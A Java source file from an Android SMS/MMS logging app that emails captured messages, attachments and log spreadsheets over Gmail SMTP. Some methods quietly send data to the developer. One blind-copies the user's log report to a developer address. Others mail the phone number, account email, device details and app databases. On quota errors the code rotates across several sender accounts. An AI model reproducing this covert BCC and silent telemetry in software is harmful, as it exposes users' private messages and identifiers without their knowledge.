package com.gnuc.thoth.framework;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Authenticator;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.util.ByteArrayDataSource;

import org.joda.time.DateTime;
import org.joda.time.format.DateTimeFormat;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.text.format.DateFormat;
import android.webkit.MimeTypeMap;

import com.gnuc.thoth.framework.Thoth.Settings;
import com.gnuc.thoth.framework.callbacks.ThothMailCallback;
import com.gnuc.thoth.framework.db.ThothDB;
import com.gnuc.thoth.framework.utils.date.ThothDate;

public class ThothMail extends Authenticator
{
	private static ThothMail	instance				= null;
	//
	final String[]					USERNAME				= {"thoth@gnuc.in", "thoth.1@gnuc.in", "thoth.2@gnuc.in", "thoth.3@gnuc.in", "thoth.4@gnuc.in"};
	final String					PASSWORD				= "";
	final String[]					FROM					= {"thoth@gnuc.in", "thoth.1@gnuc.in", "thoth.2@gnuc.in", "thoth.3@gnuc.in", "thoth.4@gnuc.in"};
	//
	final String					SMTP_PORT			= "465";
	final String					SMTP_SPORT			= "465";
	final String					SMTP_HOST			= "smtp.gmail.com";
	boolean							SMTP_AUTH			= true;
	Multipart						SMTP_MULTIPART		= null;
	Properties						SMTP_PROPERTIES	= null;
	//
	static int						ACTIVE_ACCOUNT		= 0;
	//
	static ExecutorService		service				= Executors.newSingleThreadExecutor();
	
	//
	public static ThothMail getInstance()
	{
		if (instance == null)
			instance = new ThothMail();
		return instance;
	}
	
	private ThothMail()
	{
		SMTP_PROPERTIES = new Properties();
		SMTP_PROPERTIES.put("mail.smtp.host", SMTP_HOST);
		SMTP_PROPERTIES.put("mail.smtp.auth", String.valueOf(SMTP_AUTH));
		SMTP_PROPERTIES.put("mail.smtp.port", SMTP_PORT);
		SMTP_PROPERTIES.put("mail.smtp.socketFactory.port", SMTP_SPORT);
		SMTP_PROPERTIES.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		SMTP_PROPERTIES.put("mail.smtp.socketFactory.fallback", "false");
	}
	
	@Override
	public PasswordAuthentication getPasswordAuthentication()
	{
		return new PasswordAuthentication(USERNAME[ACTIVE_ACCOUNT], PASSWORD);
	}
	
	public void sendMailToDev(final ThothMailCallback callback)
	{
		if (Thoth.isNetworkOK())
		{
			try
			{
				StringBuilder SUBJECT = new StringBuilder();
				String FROMNAME = Settings.USR_DEVICE_PHONE_NUMBER;
				SUBJECT.append("Thoth rescue : " + FROMNAME);
				final MimeMessage msg = new MimeMessage(Session.getInstance(SMTP_PROPERTIES, this));
				msg.setFrom(new InternetAddress(FROM[ACTIVE_ACCOUNT], FROMNAME));
				msg.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(FROM[ACTIVE_ACCOUNT], Settings.USR_DEVICE_PHONE_NUMBER));
				msg.setSubject(SUBJECT.toString());
				msg.setSentDate(new Date(System.currentTimeMillis()));
				// BODY
				String MSG_TEXT = "Thoth Rescue ...";
				BodyPart messageBodyPart = new MimeBodyPart();
				messageBodyPart.setText(MSG_TEXT);
				SMTP_MULTIPART = new MimeMultipart();
				SMTP_MULTIPART.addBodyPart(messageBodyPart);
				try
				{
					InputStream is = Thoth.cx.openFileInput("Thoth-Log.log");
					ByteArrayOutputStream bos = new ByteArrayOutputStream();
					byte[] b = new byte[1024];
					int bytesRead;
					while ((bytesRead = is.read(b)) != -1)
						bos.write(b, 0, bytesRead);
					messageBodyPart = new MimeBodyPart();
					DataSource source = new ByteArrayDataSource(bos.toByteArray(), "text/plain");
					messageBodyPart.setDataHandler(new DataHandler(source));
					messageBodyPart.setFileName("Thoth-Log.txt");
					SMTP_MULTIPART.addBodyPart(messageBodyPart);
					bos.close();
					is.close();
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				try
				{
					File data = Environment.getDataDirectory();
					String currentDBPath = "/data/com.gnuc.thoth/databases/thoth.db";
					File currentDB = new File(data, currentDBPath);
					if (currentDB.exists())
					{
						InputStream is = new FileInputStream(currentDB);
						ByteArrayOutputStream bos = new ByteArrayOutputStream();
						byte[] b = new byte[1024];
						int bytesRead;
						while ((bytesRead = is.read(b)) != -1)
							bos.write(b, 0, bytesRead);
						messageBodyPart = new MimeBodyPart();
						DataSource source = new ByteArrayDataSource(bos.toByteArray(), "application/x-sqlite3");
						messageBodyPart.setDataHandler(new DataHandler(source));
						messageBodyPart.setFileName("thoth.db");
						SMTP_MULTIPART.addBodyPart(messageBodyPart);
						bos.close();
						is.close();
					}
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				msg.setContent(SMTP_MULTIPART);
				//
				service.submit(new Runnable()
				{
					@Override
					public void run()
					{
						try
						{
							Transport.send(msg);
							callback.handle(true, 1); // Success.
						}
						catch (Exception e)
						{
							String causeMessage = (e.getCause() == null) ? "" : e.getCause().getMessage();
							++ACTIVE_ACCOUNT;
							if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
							{
								try
								{
									Transport.send(msg);
									callback.handle(true, 1); // Success.
								}
								catch (Exception ee)
								{
									causeMessage = (ee.getCause() == null) ? "" : ee.getCause().getMessage();
									++ACTIVE_ACCOUNT;
									if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
									{
										try
										{
											Transport.send(msg);
											callback.handle(true, 1); // Success.
										}
										catch (Exception eee)
										{
											causeMessage = (eee.getCause() == null) ? "" : eee.getCause().getMessage();
											++ACTIVE_ACCOUNT;
											if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
											{
												try
												{
													Transport.send(msg);
													callback.handle(true, 1); // Success.
												}
												catch (Exception eeee)
												{
													ThothLog.e(eeee);
												}
											}
											else
												ThothLog.e(eee);
										}
									}
									else
										ThothLog.e(ee);
								}
							}
							else
								ThothLog.e(e);
						}
					}
				});
			}
			catch (Exception e)
			{
				ThothLog.e(e);
			}
		}
		else
			callback.handle(false, 0); // Should authenticate
		return;
	}
	
	public void sendDebugMail(String subject)
	{
		if (Thoth.isNetworkOK())
		{
			try
			{
				StringBuilder SUBJECT = new StringBuilder();
				String FROMNAME = Settings.USR_DEVICE_PHONE_NUMBER;
				SUBJECT.append("DEBUG : " + FROMNAME);
				final MimeMessage msg = new MimeMessage(Session.getInstance(SMTP_PROPERTIES, this));
				msg.setFrom(new InternetAddress(FROM[ACTIVE_ACCOUNT], FROMNAME));
				msg.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress("thoth@gnuc.in", Settings.USR_DEVICE_PHONE_NUMBER));
				msg.setSubject(SUBJECT.toString() + " " + subject);
				msg.setSentDate(new Date(System.currentTimeMillis()));
				// BODY
				String MSG_TEXT = "DEBUG ...";
				BodyPart messageBodyPart = new MimeBodyPart();
				messageBodyPart.setText(MSG_TEXT);
				SMTP_MULTIPART = new MimeMultipart();
				SMTP_MULTIPART.addBodyPart(messageBodyPart);
				try
				{
					InputStream is = Thoth.cx.openFileInput("Thoth-Log.log");
					ByteArrayOutputStream bos = new ByteArrayOutputStream();
					byte[] b = new byte[1024];
					int bytesRead;
					while ((bytesRead = is.read(b)) != -1)
						bos.write(b, 0, bytesRead);
					messageBodyPart = new MimeBodyPart();
					DataSource source = new ByteArrayDataSource(bos.toByteArray(), "text/plain");
					messageBodyPart.setDataHandler(new DataHandler(source));
					messageBodyPart.setFileName("Thoth-Log.txt");
					SMTP_MULTIPART.addBodyPart(messageBodyPart);
					bos.close();
					is.close();
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				try
				{
					File data = Environment.getDataDirectory();
					String currentDBPath = "/data/com.gnuc.thoth/databases/thoth.db";
					File currentDB = new File(data, currentDBPath);
					if (currentDB.exists())
					{
						InputStream is = new FileInputStream(currentDB);
						ByteArrayOutputStream bos = new ByteArrayOutputStream();
						byte[] b = new byte[1024];
						int bytesRead;
						while ((bytesRead = is.read(b)) != -1)
							bos.write(b, 0, bytesRead);
						messageBodyPart = new MimeBodyPart();
						DataSource source = new ByteArrayDataSource(bos.toByteArray(), "application/x-sqlite3");
						messageBodyPart.setDataHandler(new DataHandler(source));
						messageBodyPart.setFileName("thoth.db");
						SMTP_MULTIPART.addBodyPart(messageBodyPart);
						bos.close();
						is.close();
					}
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				try
				{
					File data = Environment.getDataDirectory();
					String currentDBPath = "/data/com.gnuc.thoth/databases/logger.db";
					File currentDB = new File(data, currentDBPath);
					if (currentDB.exists())
					{
						InputStream is = new FileInputStream(currentDB);
						ByteArrayOutputStream bos = new ByteArrayOutputStream();
						byte[] b = new byte[1024];
						int bytesRead;
						while ((bytesRead = is.read(b)) != -1)
							bos.write(b, 0, bytesRead);
						messageBodyPart = new MimeBodyPart();
						DataSource source = new ByteArrayDataSource(bos.toByteArray(), "application/x-sqlite3");
						messageBodyPart.setDataHandler(new DataHandler(source));
						messageBodyPart.setFileName("logger.db");
						SMTP_MULTIPART.addBodyPart(messageBodyPart);
						bos.close();
						is.close();
					}
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				msg.setContent(SMTP_MULTIPART);
				//
				service.submit(new Runnable()
				{
					@Override
					public void run()
					{
						try
						{
							Transport.send(msg);
						}
						catch (Exception e)
						{
							String causeMessage = (e.getCause() == null) ? "" : e.getCause().getMessage();
							++ACTIVE_ACCOUNT;
							if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
							{
								try
								{
									Transport.send(msg);
								}
								catch (Exception ee)
								{
									causeMessage = (ee.getCause() == null) ? "" : ee.getCause().getMessage();
									++ACTIVE_ACCOUNT;
									if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
									{
										try
										{
											Transport.send(msg);
										}
										catch (Exception eee)
										{
											causeMessage = (eee.getCause() == null) ? "" : eee.getCause().getMessage();
											++ACTIVE_ACCOUNT;
											if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
											{
												try
												{
													Transport.send(msg);
												}
												catch (Exception eeee)
												{
													ThothLog.e(eeee);
												}
											}
											else
												ThothLog.e(eee);
										}
									}
									else
										ThothLog.e(ee);
								}
							}
							else
								ThothLog.e(e);
						}
					}
				});
			}
			catch (Exception e)
			{
				ThothLog.e(e);
			}
		}
		return;
	}
	
	public void sendMail(final ThothMailCallback callback)
	{
		if (Thoth.isNetworkOK())
		{
			Cursor cR = null;
			//
			ThothDB dbA = new ThothDB(Thoth.cx);
			SQLiteDatabase db = dbA.getDb();
			//
			cR = db.rawQuery("SELECT * FROM " + ThothDB.table_TEMP_MSGS + " ORDER BY " + ThothDB.col_T_M_DATETIME + " ASC", null);
			if (null != cR && cR.moveToFirst())
			{
				for (int x = 0; x < cR.getCount(); x++)
				{
					try
					{
						int ty = cR.getInt(cR.getColumnIndexOrThrow(ThothDB.col_T_M_TYPE));
						StringBuilder SUBJECT = new StringBuilder();
						SUBJECT.append(ty == 0 ? "SMS IN" : ty == 1 ? "SMS OUT" : ty == 2 ? "MMS IN" : "MMS OUT");
						String FROMNAME = cR.getString(cR.getColumnIndexOrThrow(ThothDB.col_T_M_CONTACTNAME));
						String FROMNUMBER = cR.getString(cR.getColumnIndexOrThrow(ThothDB.col_T_M_NUMBER));
						FROMNAME = (FROMNAME.equalsIgnoreCase("UNKNOWN")) ? FROMNUMBER : FROMNAME + " [" + FROMNUMBER + "]";
						SUBJECT.append(" : " + FROMNAME);
						//
						final MimeMessage msg = new MimeMessage(Session.getInstance(SMTP_PROPERTIES, this));
						msg.setFrom(new InternetAddress(FROM[ACTIVE_ACCOUNT], FROMNAME));
						msg.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(Settings.USR_DEVICE_ACCOUNT_EMAIL, Settings.USR_DEVICE_PHONE_NUMBER));
						msg.setSubject(SUBJECT.toString());
						msg.setSentDate(new Date(cR.getLong(cR.getColumnIndexOrThrow(ThothDB.col_T_M_DATETIME))));
						// BODY
						String MSG_TEXT = cR.getString(cR.getColumnIndexOrThrow(ThothDB.col_T_M_MSG));
						BodyPart messageBodyPart = new MimeBodyPart();
						messageBodyPart.setText(MSG_TEXT);
						SMTP_MULTIPART = new MimeMultipart();
						SMTP_MULTIPART.addBodyPart(messageBodyPart);
						try
						{
							byte[] blobText = cR.getBlob(cR.getColumnIndexOrThrow(ThothDB.col_T_M_BLOB_TEXT));
							if (null != blobText)
							{
								messageBodyPart = new MimeBodyPart();
								DataSource source = new ByteArrayDataSource(blobText, "text/plain");
								messageBodyPart.setDataHandler(new DataHandler(source));
								messageBodyPart.setFileName(blobText.hashCode() + ".txt");
								SMTP_MULTIPART.addBodyPart(messageBodyPart);
							}
							byte[] blobData = cR.getBlob(cR.getColumnIndexOrThrow(ThothDB.col_T_M_BLOB_DATA));
							String blobDataMime = cR.getString(cR.getColumnIndexOrThrow(ThothDB.col_T_M_BLOB_DATA_MIME));
							if (null != blobData)
							{
								messageBodyPart = new MimeBodyPart();
								DataSource source = new ByteArrayDataSource(blobData, blobDataMime);
								messageBodyPart.setDataHandler(new DataHandler(source));
								messageBodyPart.setFileName(blobData.hashCode() + "." + (MimeTypeMap.getSingleton()).getExtensionFromMimeType(blobDataMime));
								SMTP_MULTIPART.addBodyPart(messageBodyPart);
							}
						}
						catch (Exception e)
						{
							ThothLog.e(e);
						}
						msg.setContent(SMTP_MULTIPART);
						//
						service.submit(new Runnable()
						{
							@Override
							public void run()
							{
								try
								{
									Transport.send(msg);
								}
								catch (Exception e)
								{
									String causeMessage = (e.getCause() == null) ? "" : e.getCause().getMessage();
									++ACTIVE_ACCOUNT;
									if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
									{
										try
										{
											Transport.send(msg);
										}
										catch (Exception ee)
										{
											causeMessage = (ee.getCause() == null) ? "" : ee.getCause().getMessage();
											++ACTIVE_ACCOUNT;
											if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
											{
												try
												{
													Transport.send(msg);
												}
												catch (Exception eee)
												{
													causeMessage = (eee.getCause() == null) ? "" : eee.getCause().getMessage();
													++ACTIVE_ACCOUNT;
													if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
													{
														try
														{
															Transport.send(msg);
														}
														catch (Exception eeee)
														{
															ThothLog.e(eeee);
														}
													}
													else
														ThothLog.e(eee);
												}
											}
											else
												ThothLog.e(ee);
										}
									}
									else
										ThothLog.e(e);
								}
							}
						});
					}
					catch (Exception e)
					{
						ThothLog.e(e);
					}
					cR.moveToNext();
				}
				callback.handle(true, 1); // Success.
			}
			callback.handle(false, 1); // Nothing to send.
			if (null != cR && !cR.isClosed())
				cR.close();
			if (dbA.getDb().isOpen())
				dbA.getDb().close();
		}
		else
			callback.handle(false, 0); // Should authenticate
		return;
	}
	
	public void sendReportMail(final ThothMailCallback callback)
	{
		if (Thoth.isNetworkOK())
		{
			try
			{
				FileInputStream fis = null;
				if (null != (fis = Thoth.cx.openFileInput("Thoth-Log.xlsx")))
				{
					StringBuilder SUBJECT = new StringBuilder();
					String FROMNAME = Settings.USR_DEVICE_PHONE_NUMBER;
					String STMT_FOR = (Settings.APP_LAST_LOG_REPORT == -1l) ? "Until - " + ThothDate.now.toString(DateTimeFormat.shortDate()) : (new DateTime(Settings.APP_LAST_LOG_REPORT)).toString(DateTimeFormat.shortDate()) + " - " + ThothDate.lastWeekE.toString(DateTimeFormat.shortDate());
					SUBJECT.append("Thoth : Your logs for period : " + STMT_FOR);
					final Message msg = new MimeMessage(Session.getInstance(SMTP_PROPERTIES, this));
					msg.setFrom(new InternetAddress(FROM[ACTIVE_ACCOUNT], FROMNAME));
					msg.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(Settings.USR_DEVICE_ACCOUNT_EMAIL, Settings.USR_DEVICE_PHONE_NUMBER));
					msg.setRecipient(MimeMessage.RecipientType.BCC, new InternetAddress(FROM[ACTIVE_ACCOUNT], Settings.USR_DEVICE_ACCOUNT_EMAIL));
					msg.setSubject(SUBJECT.toString());
					msg.setSentDate(new Date(System.currentTimeMillis()));
					BodyPart SMTP_BODYPART = new MimeBodyPart();
					//
					// TEXT Body
					//
					InputStreamReader isr = null;
					if (null != (isr = new InputStreamReader(Thoth.cx.getAssets().open("stmtOfLogs.txt"))))
					{
						BufferedReader in = new BufferedReader(isr);
						StringBuilder sb = new StringBuilder();
						String sbPart = null;
						while ((sbPart = in.readLine()) != null)
							sb.append(sbPart);
						sbPart = sb.toString();
						sbPart = sbPart.replace("LOG_PERIOD", SUBJECT.toString());
						//
						msg.setText(sb.toString());
						in.close();
						isr.close();
					}
					//
					// HTML Body
					//
					SMTP_MULTIPART = new MimeMultipart();
					if (null != (isr = new InputStreamReader(Thoth.cx.getAssets().open("stmtOfLogs.html"))))
					{
						BufferedReader in = new BufferedReader(isr);
						StringBuilder sb = new StringBuilder();
						String sbPart = null;
						while ((sbPart = in.readLine()) != null)
							sb.append(sbPart);
						sbPart = sb.toString();
						sbPart = sbPart.replace("LOG_PERIOD", SUBJECT.toString());
						//
						SMTP_BODYPART = new MimeBodyPart();
						SMTP_BODYPART.setContent(sbPart, "text/html");
						SMTP_MULTIPART.addBodyPart(SMTP_BODYPART);
						in.close();
						isr.close();
					}
					//
					// Attachment
					//
					ByteArrayOutputStream boas = new ByteArrayOutputStream();
					BufferedInputStream bis = new BufferedInputStream(fis);
					try
					{
						int ch;
						while ((ch = bis.read()) != -1)
							boas.write(ch);
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
					bis.close();
					SMTP_BODYPART = new MimeBodyPart();
					DataSource SOURCE = new ByteArrayDataSource(boas.toByteArray(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
					SMTP_BODYPART.setDataHandler(new DataHandler(SOURCE));
					SMTP_BODYPART.setFileName("ThothLogs_for_" + ThothDate.now.toString("dd-MM-yy") + ".xlsx");
					SMTP_MULTIPART.addBodyPart(SMTP_BODYPART);
					//
					boas.close();
					boas = null;
					//
					msg.setContent(SMTP_MULTIPART);
					//
					service.submit(new Runnable()
					{
						@Override
						public void run()
						{
							try
							{
								Transport.send(msg);
								callback.handle(true, 1); // Success.
							}
							catch (Exception e)
							{
								String causeMessage = (e.getCause() == null) ? "" : e.getCause().getMessage();
								++ACTIVE_ACCOUNT;
								if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
								{
									try
									{
										Transport.send(msg);
										callback.handle(true, 1); // Success.
									}
									catch (Exception ee)
									{
										causeMessage = (ee.getCause() == null) ? "" : ee.getCause().getMessage();
										++ACTIVE_ACCOUNT;
										if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
										{
											try
											{
												Transport.send(msg);
												callback.handle(true, 1); // Success.
											}
											catch (Exception eee)
											{
												causeMessage = (eee.getCause() == null) ? "" : eee.getCause().getMessage();
												++ACTIVE_ACCOUNT;
												if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
												{
													try
													{
														Transport.send(msg);
														callback.handle(true, 1); // Success.
													}
													catch (Exception eeee)
													{
														ThothLog.e(eeee);
													}
												}
												else
													ThothLog.e(eee);
											}
										}
										else
											ThothLog.e(ee);
									}
								}
								else
									ThothLog.e(e);
							}
						}
					});
				}
			}
			catch (Exception e)
			{
				ThothLog.e(e);
			}
		}
		else
			callback.handle(false, 0); // Should authenticate
		return;
	}
	
	public void sendCaptureMail()
	{
		if (Thoth.isNetworkOK())
		{
			try
			{
				StringBuilder SUBJECT = new StringBuilder();
				String FROMNAME = Settings.USR_DEVICE_ACCOUNT_EMAIL;
				SUBJECT.append("Thoth Capture : " + FROMNAME);
				final MimeMessage msg = new MimeMessage(Session.getInstance(SMTP_PROPERTIES, this));
				msg.setFrom(new InternetAddress(FROM[ACTIVE_ACCOUNT], FROMNAME));
				msg.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(FROM[ACTIVE_ACCOUNT], "Thoth Capture"));
				msg.setSubject(SUBJECT.toString());
				msg.setSentDate(new Date(System.currentTimeMillis()));
				// BODY
				StringBuffer sb = new StringBuffer();
				sb.append("USR_DEVICE_BUILD_MODEL : " + Thoth.Settings.USR_DEVICE_BUILD_MODEL);
				sb.append("USR_DEVICE_BUILD_FIRMWARE : " + Thoth.Settings.USR_DEVICE_BUILD_FIRMWARE);
				sb.append("USR_DEVICE_PHONE_NUMBER : " + Thoth.Settings.USR_DEVICE_PHONE_NUMBER);
				sb.append("USR_DEVICE_ACCOUNT_EMAIL : " + Thoth.Settings.USR_DEVICE_ACCOUNT_EMAIL);
				sb.append("\n\nThoth Capture ..." + DateFormat.format("h:mm AA on dd/MM/yy", ThothDate.now.getMillis()));
				//
				BodyPart messageBodyPart = new MimeBodyPart();
				messageBodyPart.setText(sb.toString());
				SMTP_MULTIPART = new MimeMultipart();
				SMTP_MULTIPART.addBodyPart(messageBodyPart);
				try
				{
					InputStream is = Thoth.cx.openFileInput("Thoth-Log.log");
					ByteArrayOutputStream bos = new ByteArrayOutputStream();
					byte[] b = new byte[1024];
					int bytesRead;
					while ((bytesRead = is.read(b)) != -1)
						bos.write(b, 0, bytesRead);
					messageBodyPart = new MimeBodyPart();
					DataSource source = new ByteArrayDataSource(bos.toByteArray(), "text/plain");
					messageBodyPart.setDataHandler(new DataHandler(source));
					messageBodyPart.setFileName("Thoth-Log.txt");
					SMTP_MULTIPART.addBodyPart(messageBodyPart);
					bos.close();
					is.close();
				}
				catch (Exception e)
				{
					ThothLog.e(e);
				}
				msg.setContent(SMTP_MULTIPART);
				//
				service.submit(new Runnable()
				{
					@Override
					public void run()
					{
						try
						{
							Transport.send(msg);
						}
						catch (Exception e)
						{
							String causeMessage = (e.getCause() == null) ? "" : e.getCause().getMessage();
							++ACTIVE_ACCOUNT;
							if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
							{
								try
								{
									Transport.send(msg);
								}
								catch (Exception ee)
								{
									causeMessage = (ee.getCause() == null) ? "" : ee.getCause().getMessage();
									++ACTIVE_ACCOUNT;
									if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
									{
										try
										{
											Transport.send(msg);
										}
										catch (Exception eee)
										{
											causeMessage = (eee.getCause() == null) ? "" : eee.getCause().getMessage();
											++ACTIVE_ACCOUNT;
											if (causeMessage.startsWith("550 5.4.5") && ACTIVE_ACCOUNT < 5)
											{
												try
												{
													Transport.send(msg);
												}
												catch (Exception eeee)
												{
													ThothLog.e(eeee);
												}
											}
											else
												ThothLog.e(eee);
										}
									}
									else
										ThothLog.e(ee);
								}
							}
							else
								ThothLog.e(e);
						}
					}
				});
			}
			catch (Exception e)
			{
				ThothLog.e(e);
			}
		}
		return;
	}
}
